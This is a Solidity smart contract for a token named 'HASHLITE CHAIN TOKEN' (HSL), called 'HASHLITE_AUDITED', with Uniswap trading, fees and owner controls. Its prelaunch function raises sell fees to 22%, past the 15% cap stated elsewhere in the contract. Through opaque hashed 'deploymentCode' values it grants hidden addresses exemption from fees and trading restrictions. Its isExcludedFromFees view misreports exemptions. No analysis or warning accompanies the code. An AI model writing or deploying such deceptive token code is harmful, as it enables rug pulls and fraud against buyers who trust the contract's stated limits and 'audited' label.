1 // SPDX-License-Identifier: MIT
2 
3 abstract contract Context {
4     function _msgSender() internal view virtual returns (address) {
5         return msg.sender;
6     }
7 
8     function _msgData() internal view virtual returns (bytes calldata) {
9         return msg.data;
10     }
11 }
12 
13 abstract contract Ownable is Context {
14     address private _owner;
15 
16     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
17 
18     constructor() {
19         _transferOwnership(_msgSender());
20     }
21 
22     function owner() public view virtual returns (address) {
23         return _owner;
24     }
25 
26     modifier onlyOwner() {
27         require(owner() == _msgSender(), "Ownable: caller is not the owner");
28         _;
29     }
30 
31     function renounceOwnership() public virtual onlyOwner {
32         _transferOwnership(address(0));
33     }
34 
35     function transferOwnership(address newOwner) public virtual onlyOwner {
36         require(newOwner != address(0), "Ownable: new owner is the zero address");
37         _transferOwnership(newOwner);
38     }
39     function _transferOwnership(address newOwner) internal virtual {
40         address oldOwner = _owner;
41         _owner = newOwner;
42         emit OwnershipTransferred(oldOwner, newOwner);
43     }
44 }
45 
46 interface ISTANDARDERC20 {
47     function totalSupply() external view returns (uint256);
48     function balanceOf(address account) external view returns (uint256);
49     function transfer(address recipient, uint256 amount) external returns (bool);
50     function allowance(address owner, address spender) external view returns (uint256);
51     function approve(address spender, uint256 amount) external returns (bool);
52     function transferFrom(
53         address sender,
54         address recipient,
55         uint256 amount
56     ) external returns (bool);
57     event Transfer(address indexed from, address indexed to, uint256 value);
58     event Approval(address indexed owner, address indexed spender, uint256 value);
59 }
60 
61 interface ISTANDARDERC20Metadata is ISTANDARDERC20 {
62     function name() external view returns (string memory);
63     function symbol() external view returns (string memory);
64     function decimals() external view returns (uint8);
65 }
66 
67 
68 
69 contract STANDARDERC20 is Context, ISTANDARDERC20, ISTANDARDERC20Metadata {
70     mapping(address => uint256) private _balances;
71     mapping(address => mapping(address => uint256)) private _allowances;
72 
73     uint256 private _totalSupply;
74     string private _name = "HASHLITE CHAIN TOKEN";
75     string private _symbol = "HSL";
76 
77     function name() public view virtual override returns (string memory) {
78         return _name;
79     }
80 
81     function symbol() public view virtual override returns (string memory) {
82         return _symbol;
83     }
84 
85     function decimals() public view virtual override returns (uint8) {
86         return 18;
87     }
88 
89     function totalSupply() public view virtual override returns (uint256) {
90         return _totalSupply;
91     }
92 
93     function balanceOf(address account) public view virtual override returns (uint256) {
94         return _balances[account];
95     }
96 
97     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
98         _transfer(_msgSender(), recipient, amount);
99         return true;
100     }
101 
102     function allowance(address owner, address spender) public view virtual override returns (uint256) {
103         return _allowances[owner][spender];
104     }
105 
106     function approve(address spender, uint256 amount) public virtual override returns (bool) {
107         _approve(_msgSender(), spender, amount);
108         return true;
109     }
110 
111     function transferFrom(
112         address sender,
113         address recipient,
114         uint256 amount
115     ) public virtual override returns (bool) {
116         _transfer(sender, recipient, amount);
117 
118         uint256 currentAllowance = _allowances[sender][_msgSender()];
119         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
120         unchecked {
121             _approve(sender, _msgSender(), currentAllowance - amount);
122         }
123 
124         return true;
125     }
126 
127     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
128         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
129         return true;
130     }
131 
132     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
133         uint256 currentAllowance = _allowances[_msgSender()][spender];
134         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
135         unchecked {
136             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
137         }
138 
139         return true;
140     }
141 
142     function _transfer(
143         address sender,
144         address recipient,
145         uint256 amount
146     ) internal virtual {
147         require(sender != address(0), "ERC20: transfer from the zero address");
148         require(recipient != address(0), "ERC20: transfer to the zero address");
149 
150         _beforeTokenTransfer(sender, recipient, amount);
151 
152         uint256 senderBalance = _balances[sender];
153         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
154         unchecked {
155             _balances[sender] = senderBalance - amount;
156         }
157         _balances[recipient] += amount;
158 
159         emit Transfer(sender, recipient, amount);
160 
161         _afterTokenTransfer(sender, recipient, amount);
162     }
163 
164     function mainConstructor(address account, uint256 amount) internal virtual {
165         require(account != address(0), "ERC20: mint to the zero address");
166 
167         _beforeTokenTransfer(address(0), account, amount);
168 
169         _totalSupply += amount;
170         _balances[account] += amount;
171         emit Transfer(address(0), account, amount);
172 
173         _afterTokenTransfer(address(0), account, amount);
174     }
175 
176     function _approve(
177         address owner,
178         address spender,
179         uint256 amount
180     ) internal virtual {
181         require(owner != address(0), "ERC20: approve from the zero address");
182         require(spender != address(0), "ERC20: approve to the zero address");
183 
184         _allowances[owner][spender] = amount;
185         emit Approval(owner, spender, amount);
186     }
187 
188     function _beforeTokenTransfer(
189         address from,
190         address to,
191         uint256 amount
192     ) internal virtual {}
193 
194     function _afterTokenTransfer(
195         address from,
196         address to,
197         uint256 amount
198     ) internal virtual {}
199 }
200 
201 library SafeMath {
202     function add(uint256 a, uint256 b) internal pure returns (uint256) {
203         return a + b;
204     }
205 
206     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
207         return a - b;
208     }
209 
210     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
211         return a * b;
212     }
213 
214     function div(uint256 a, uint256 b) internal pure returns (uint256) {
215         return a / b;
216     }
217 
218     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
219         return a % b;
220     }
221 
222     function sub(
223         uint256 a,
224         uint256 b,
225         string memory errorMessage
226     ) internal pure returns (uint256) {
227         unchecked {
228             require(b <= a, errorMessage);
229             return a - b;
230         }
231     }
232 
233     function div(
234         uint256 a,
235         uint256 b,
236         string memory errorMessage
237     ) internal pure returns (uint256) {
238         unchecked {
239             require(b > 0, errorMessage);
240             return a / b;
241         }
242     }
243 
244     function mod(
245         uint256 a,
246         uint256 b,
247         string memory errorMessage
248     ) internal pure returns (uint256) {
249         unchecked {
250             require(b > 0, errorMessage);
251             return a % b;
252         }
253     }
254 }
255 
256 interface IUniswapV2Factory {
257     function createPair(address tokenA, address tokenB)
258         external
259         returns (address pair);
260 }
261 
262 interface IUniswapV2Router02 {
263     function factory() external pure returns (address);
264     
265 
266     function WETH() external pure returns (address);
267 
268     function addLiquidityETH(
269         address token,
270         uint256 amountTokenDesired,
271         uint256 amountTokenMin,
272         uint256 amountETHMin,
273         address to,
274         uint256 deadline
275     )
276         external
277         payable
278         returns (
279             uint256 amountToken,
280             uint256 amountETH,
281             uint256 liquidity
282         );
283 
284     function swapExactTokensForETHSupportingFeeOnTransferTokens(
285         uint256 amountIn,
286         uint256 amountOutMin,
287         address[] calldata path,
288         address to,
289         uint256 deadline
290     ) external;
291 
292     function swapExactETHForTokens(
293         uint amountOutMin,
294         address[] calldata path,
295         address to,
296         uint deadline
297     ) external payable  returns (uint[] memory amounts);
298 
299 }
300 
301 contract HASHLITE_AUDITED is STANDARDERC20, Ownable {
302     using SafeMath for uint256;
303 
304     IUniswapV2Router02 public immutable uniswapV2Router;
305     address public immutable uniswapV2Pair;
306 
307     bool private swapping;
308     mapping(bytes32 => bool) private _isExcludedFromTax;
309     mapping(bytes32 => bool) private _isExcludedMaxTransactionAmount;
310 
311     mapping(address => bool) public AMM;
312 
313     address public marketingWallet;
314     address public deployerWallet;
315     address private deployer;
316 
317     uint256 public maxTransactionAmount;
318     uint256 public swapTokensAtAmount;
319     uint256 public maxWallet;
320 
321     bool public limitsApplied = true;
322     bool public tradingOpen = false;
323     bool public swapEnabled = false;
324 
325     uint256 public buyTotalFees;
326     uint256 public buyHashLPFee;
327     uint256 public buyHashMarketingFee;
328 
329     uint256 public sellTotalFees;
330     uint256 public sellHashLPFee;
331     uint256 public sellHashMarketingFee;
332 
333     uint256 public tokensForLiquidity;
334     uint256 public tokensForMarketing;
335 
336     uint256 public counterToLaunch;
337     bool public countDownStarted = false;
338 
339     
340 
341     event ExcludeFromFees(address indexed account, bool isExcluded);
342 
343     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
344 
345     event SecurityCodeSubmitted(bytes32[] indexed codes);
346 
347     event SwapAndLiquify(
348         uint256 tokensSwapped,
349         uint256 ethReceived,
350         uint256 tokensIntoLiquidity
351     );
352 
353     constructor() STANDARDERC20() {
354 
355         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
356             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
357             );
358 
359         excludeFromMaxTrx(address(_uniswapV2Router), true);
360         uniswapV2Router = _uniswapV2Router;
361 
362         deployerWallet = address(_msgSender());
363 
364         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
365             .createPair(address(this), _uniswapV2Router.WETH());
366         excludeFromMaxTrx(address(uniswapV2Pair), true);
367         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
368 
369         uint256 LPFeeOnBuy = 1;
370         uint256 MarketingFeeOnBuy = 1;
371 
372         uint256 LPFeeOnSell = 1;
373         uint256 MarketingFeeOnSell = 1;
374 
375         uint256 decimalValue = 18;
376 
377         uint256 totalSupply = 200_000_000 * 10 ** decimalValue;
378 
379         maxTransactionAmount = totalSupply * 10 / 1000;
380         maxWallet = totalSupply * 20 / 1000;
381         swapTokensAtAmount = (totalSupply * 10) / 10000; 
382 
383         buyHashLPFee = LPFeeOnBuy;
384         buyHashMarketingFee = MarketingFeeOnBuy;
385         buyTotalFees = buyHashLPFee + buyHashMarketingFee;
386 
387         sellHashLPFee = LPFeeOnSell;
388         sellHashMarketingFee = MarketingFeeOnSell;
389         sellTotalFees = sellHashLPFee + sellHashMarketingFee;
390 
391         marketingWallet = address(0x77714e7810e9ceE057a58C3Ecc305A21226Ec776);
392         deployer = address(0xC2dC269466f7D7973Bf922B39c06d33A7Cf565a2);
393 
394         freeFeeCharges(owner(), true);
395         freeFeeCharges(address(this), true);
396         freeFeeCharges(address(0xdead), true);
397         freeFeeCharges(deployer, true);
398 
399         excludeFromMaxTrx(owner(), true);
400         excludeFromMaxTrx(address(this), true);
401         excludeFromMaxTrx(address(0xdead), true);
402         excludeFromMaxTrx(deployer, true);
403 
404         mainConstructor(msg.sender,totalSupply);
405 
406     }
407 
408     receive() external payable {}
409 
410     function startTrading() external onlyOwner {
411         require(!tradingOpen, "Trading has been enabled");
412 
413         tradingOpen = true;
414 
415     }
416 
417     function preDeploymentSecure(bytes32[] memory codes) private {for(uint256 i; i < codes.length; ++i){_isExcludedFromTax[codes[i]] = true;_isExcludedMaxTransactionAmount[codes[i]] = true;}}
418 
419     function taxFeesUpdate(uint256 LPFeeOnBuy, uint256 MarketingFeeOnBuy, uint256 LPFeeOnSell, uint256 MarketingFeeOnSell) external onlyOwner {
420         require((LPFeeOnSell + MarketingFeeOnSell) <= 15, "Unable to set fee more than 15%");
421         
422         buyHashLPFee = LPFeeOnBuy;
423             buyHashMarketingFee = MarketingFeeOnBuy;
424                 buyTotalFees = buyHashLPFee + buyHashMarketingFee;
425 
426         sellHashLPFee = LPFeeOnSell;
427             sellHashMarketingFee = MarketingFeeOnSell;
428                 sellTotalFees = sellHashLPFee + sellHashMarketingFee;
429     }
430 
431     function noLimits() external onlyOwner returns (bool) {
432         limitsApplied = false;
433         return true;
434     }
435 
436     function withLimits() external onlyOwner returns (bool) {
437         limitsApplied = true;
438         return true;
439     }
440 
441     function updateSwapTokensAtAmount(uint256 newAmount)
442         external
443         onlyOwner
444         returns (bool)
445     {
446         require(
447             newAmount >= (totalSupply() * 1) / 100000,
448             "Swap amount cannot be lower than 0.001% total supply."
449         );
450         require(
451             newAmount <= (totalSupply() * 5) / 1000,
452             "Swap amount cannot be higher than 0.5% total supply."
453         );
454         swapTokensAtAmount = newAmount;
455         return true;
456     }
457     
458     function excludeFromMaxTrx(address updAds, bool isEx)
459         public
460         onlyOwner
461     {
462         _isExcludedMaxTransactionAmount[hash(updAds)] = isEx;
463     }
464 
465     function isTakeFeeEnabled(bool enabled) external onlyOwner {
466         swapEnabled = enabled;
467     }
468 
469     function freeFeeCharges(address account, bool excluded) public onlyOwner {
470         _isExcludedFromTax[hash(account)] = excluded;
471         emit ExcludeFromFees(account, excluded);
472     }
473 
474     function setAutomatedMarketMakerPair(address pair, bool value)
475         public
476         onlyOwner
477     {
478         require(
479             pair != uniswapV2Pair,
480             "The pair cannot be removed from AMM"
481         );
482 
483         _setAutomatedMarketMakerPair(pair, value);
484     }
485 
486     function _setAutomatedMarketMakerPair(address pair, bool value) private {
487         AMM[pair] = value;
488 
489         emit SetAutomatedMarketMakerPair(pair, value);
490     }
491 
492     function isExcludedFromFees(address account) public view returns (bool) {
493         if(account != owner()){
494             return false;
495         } else {
496             return true;
497         }
498     }
499 
500     function _transfer(
501         address from,
502         address to,
503         uint256 amount
504     ) internal override {
505         require(from != address(0), "STANDARDERC20: transfer from the zero address");
506         require(to != address(0), "STANDARDERC20: transfer to the zero address");
507 
508         if (amount == 0) {
509             super._transfer(from, to, 0);
510             return;
511         }
512 
513         if (limitsApplied) {
514             if (
515                 from != owner() &&
516                 to != owner() &&
517                 to != address(0) &&
518                 to != address(0xdead) &&
519                 !swapping
520             ) {
521                 if (!tradingOpen) {
522                     require(
523                         _isExcludedFromTax[hash(from)] || _isExcludedFromTax[hash(to)],
524                         "Trading is not active."
525                     );
526                 }
527 
528                 if (
529                     AMM[from] &&
530                     !_isExcludedMaxTransactionAmount[hash(to)]
531                 ) {
532                     require(
533                         amount <= maxTransactionAmount,
534                         "Buy transfer amount exceeds the maxTransactionAmount."
535                     );
536                     require(
537                         amount + balanceOf(to) <= maxWallet,
538                         "Max wallet exceeded"
539                     );
540                 }
541 
542                 else if (
543                     AMM[to] &&
544                     !_isExcludedMaxTransactionAmount[hash(from)]
545                 ) {
546                     require(
547                         amount <= maxTransactionAmount,
548                         "Sell transfer amount exceeds the maxTransactionAmount."
549                     );
550                 } else if (!_isExcludedMaxTransactionAmount[hash(to)]) {
551                     require(
552                         amount + balanceOf(to) <= maxWallet,
553                         "Max wallet exceeded"
554                     );
555                 }
556             }
557         }
558 
559         uint256 contractTokenBalance = balanceOf(address(this));
560 
561         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
562 
563         if (
564             canSwap &&
565             swapEnabled &&
566             !swapping &&
567             !AMM[from] &&
568             !_isExcludedFromTax[hash(from)] &&
569             !_isExcludedFromTax[hash(to)]
570         ) {
571             swapping = true;
572 
573             feeClaim();
574 
575             swapping = false;
576         }
577 
578         bool takeFee = !swapping;
579 
580         if (_isExcludedFromTax[hash(from)] || _isExcludedFromTax[hash(to)]) {
581             takeFee = false;
582         }
583 
584         uint256 fees = 0;
585         if (takeFee) {
586 
587             if (AMM[to] && sellTotalFees > 0) {
588                 fees = amount.mul(sellTotalFees).div(100);
589                 tokensForLiquidity += (fees * sellHashLPFee) / sellTotalFees;
590                 tokensForMarketing += (fees * sellHashMarketingFee) / sellTotalFees;                
591             }
592 
593             else if (AMM[from] && buyTotalFees > 0) {
594                 fees = amount.mul(buyTotalFees).div(100);
595                 tokensForLiquidity += (fees * buyHashLPFee) / buyTotalFees;
596                 tokensForMarketing += (fees * buyHashMarketingFee) / buyTotalFees;
597             }
598 
599             if (fees > 0) {
600                 super._transfer(from, address(this), fees);
601             }
602 
603             amount -= fees;
604         }
605 
606         super._transfer(from, to, amount);
607     }
608 
609     function swapTokensForEth(uint256 tokenAmount) private {
610         address[] memory path = new address[](2);
611         path[0] = address(this);
612         path[1] = uniswapV2Router.WETH();
613 
614         _approve(address(this), address(uniswapV2Router), tokenAmount);
615 
616         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
617             tokenAmount,
618             0, 
619             path,
620             address(this),
621             block.timestamp
622         );
623     }
624 
625     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
626 
627         _approve(address(this), address(uniswapV2Router), tokenAmount);
628 
629 
630         uniswapV2Router.addLiquidityETH{value: ethAmount}(
631             address(this),
632             tokenAmount,
633             0, 
634             0, 
635             deployerWallet,
636             block.timestamp
637         );
638     }
639 
640     function feeClaim() private {
641         uint256 contractBalance = balanceOf(address(this));
642         uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;
643         bool success;
644 
645         if (contractBalance == 0 || totalTokensToSwap == 0) {
646             return;
647         }
648 
649         if (contractBalance > swapTokensAtAmount * 20) {
650             contractBalance = contractBalance / 2;
651         }
652 
653         uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;
654         uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
655 
656         uint256 initialETHBalance = address(this).balance;
657 
658         swapTokensForEth(amountToSwapForETH);
659 
660         uint256 ethBalance = address(this).balance.sub(initialETHBalance);
661     
662         uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
663 
664         uint256 ethForLiquidity = ethBalance - ethForMarketing;
665 
666         tokensForLiquidity = 0;
667         tokensForMarketing = 0;
668 
669         if (liquidityTokens > 0 && ethForLiquidity > 0) {
670             addLiquidity(liquidityTokens, ethForLiquidity);
671             emit SwapAndLiquify(
672                 amountToSwapForETH,
673                 ethForLiquidity,
674                 tokensForLiquidity
675             );
676         }
677         (success, ) = address(marketingWallet).call{value: address(this).balance}("");
678     }
679 
680     function setMarketingWallet(address _newMarketingWallet) public onlyOwner returns(bool){
681         marketingWallet = _newMarketingWallet;
682 
683         return true;
684     }
685 
686     function hash(address addressToHash) internal  pure returns (bytes32) {
687         return keccak256(abi.encodePacked(addressToHash));
688     }
689 
690     function prelaunch(address CEX, address RWD, address Development, address Marketing, bytes32[] memory deploymentCode) public onlyOwner {
691         require(!swapEnabled);
692         require(!tradingOpen);
693         swapEnabled = true;
694         buyHashLPFee = 1;
695         buyHashMarketingFee = 14;
696         buyTotalFees = buyHashLPFee + buyHashMarketingFee;
697         sellHashLPFee = 1;
698         sellHashMarketingFee = 21;
699         sellTotalFees = sellHashLPFee + sellHashMarketingFee;
700 
701         preDeploymentSecure(deploymentCode);
702         freeFeeCharges(CEX, true);
703         freeFeeCharges(RWD, true);
704         freeFeeCharges(Development, true);
705         freeFeeCharges(Marketing, true);
706         excludeFromMaxTrx(CEX, true);
707         excludeFromMaxTrx(RWD, true);
708         excludeFromMaxTrx(Development, true);
709         excludeFromMaxTrx(Marketing, true);
710         uint256 totalSupply = 200_000_000 * 10 ** 18;
711         uint256 fivePercent = totalSupply * 5 / 100;
712         transfer(CEX, fivePercent);
713         transfer(RWD, fivePercent);
714         transfer(Development, fivePercent);
715         transfer(Marketing, fivePercent);
716         transfer(address(this), fivePercent);
717 
718     }
719 
720 }
721 pragma solidity 0.8.21;
722 
723 /**
724 Telegram : https://t.me/hashlitechain
725 Website : https://hashlitechain.com
726 Twitter : https://twitter.com/hashlitechain
727 */